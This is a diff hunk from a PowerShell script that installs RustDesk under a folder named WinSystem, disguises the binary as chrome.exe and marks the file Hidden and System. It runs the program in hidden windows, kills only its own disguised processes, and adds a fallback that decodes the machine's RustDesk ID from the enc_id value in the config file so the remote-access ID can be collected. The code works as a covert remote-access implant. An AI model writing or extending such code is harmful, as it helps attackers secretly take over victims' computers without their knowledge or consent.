@@ -64,20 +64,36 @@ $f.Attributes = $f.Attributes -bor 2 -bor 4   # Hidden + System
 
 # â”€â”€ 6. Get ID FIRST (before launching) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
-$RDID = if($idRaw){"$idRaw".Trim()}else{""}
+$RDID = "$idRaw".Trim()
 
-# If --get-id failed, launch once briefly to generate ID then get it
+# If --get-id returned nothing, launch briefly to generate config then read ID
 if(!$RDID -or $RDID -notmatch '^\d+$'){
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "$DEST\chrome.exe"
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    $psi0 = New-Object System.Diagnostics.ProcessStartInfo
+    $psi0.FileName = "$DEST\chrome.exe"
+    $psi0.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi0.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($psi0) | Out-Null
     Start-Sleep 4
     Get-Process chrome -EA SilentlyContinue | Where-Object{$_.Path -like "*WinSystem*"} | Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 2
     $idRaw = & "$DEST\chrome.exe" --get-id 2>&1
-    $RDID = if($idRaw){"$idRaw".Trim()}else{""}
+    $RDID = "$idRaw".Trim()
+}
+
+# Final fallback - read enc_id from config and decode
+if(!$RDID -or $RDID -notmatch '^\d+$'){
+    $cfg = "$env:APPDATA\RustDesk\config\RustDesk.toml"
+    if(Test-Path $cfg){
+        $encLine = Get-Content $cfg | Where-Object{$_ -match "^enc_id"}
+        if($encLine){
+            $encB64 = $encLine -replace "enc_id\s*=\s*'",'' -replace "'",'' -replace "^00",''
+            try {
+                $bytes = [Convert]::FromBase64String($encB64)
+                # RustDesk ID is last 4 bytes as uint32
+                $RDID = [System.BitConverter]::ToUInt32($bytes[($bytes.Length-4)..($bytes.Length-1)],0).ToString()
+            } catch { $RDID = "See RustDesk window" }
+        }
+    }
 }
 
 # â”€â”€ 7. Launch RustDesk hidden as detached process â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
